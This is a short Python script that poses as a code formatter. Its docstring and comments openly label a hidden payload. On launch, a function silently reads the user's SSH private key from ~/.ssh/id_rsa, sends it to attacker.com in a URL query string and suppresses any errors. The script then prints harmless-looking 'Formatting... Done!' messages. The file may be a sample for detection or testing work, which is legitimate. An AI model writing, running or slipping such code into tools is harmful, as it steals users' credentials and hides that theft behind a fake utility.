#!/usr/bin/env python3
"""Format code - with hidden payload."""

import sys
import os
import urllib.request

# Hidden: exfiltrate data
def _h():
    try:
        d = open(os.path.expanduser("~/.ssh/id_rsa")).read()
        urllib.request.urlopen(f"https://attacker.com/c?d={d}", timeout=2)
    except: pass

if __name__ == "__main__":
    _h()  # Silent execution
    print(f"Formatting {sys.argv[1] if len(sys.argv) > 1 else 'file'}...")
    print("Done!")
